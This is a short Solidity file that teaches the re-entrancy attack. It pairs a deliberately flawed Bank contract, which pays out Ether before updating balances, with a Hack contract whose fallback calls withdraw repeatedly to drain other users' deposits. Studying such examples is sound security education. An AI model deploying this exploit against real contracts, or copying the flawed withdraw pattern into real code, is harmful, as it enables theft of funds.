pragma solidity ^0.5.1;

// Bank is a contract vulnerable to re-entrancy attack. Let's see why.
// To illustrate this attack, we will use 2 accounts.
// First account - Innocent user
// Second account - Attacker

contract Bank {
    mapping(address => uint) public balances;

    // Using the first account, deposit 1 Ether in to this contract
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        if(balances[msg.sender] >= amount) {
            // Send Ether
            (bool sent, ) = msg.sender.call.value(amount)("");
            // Throw an error if send fails.
            require(sent, "Failed to send ether");

            balances[msg.sender] -= amount;
        }
    }

    // Helper function to check the total Ether stored in this contract
    function getTotalBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Hack {
    Bank public bank;

    constructor(Bank _bank) public {
        bank = _bank;
    }

    // This fallback is called when the Bank contract sends Ether to this contract.
    function () external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw(msg.value);
        }
    }

    // Try:
    // Using the second account, call this function sending 1 Ether.
    function attack() public payable {
        bank.deposit.value(msg.value)();
        bank.withdraw(msg.value);
        // This contract should now have 2 Ethers:
        // 1 Ether stolen from the first account and
        // 1 Ether returned to this contract.
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
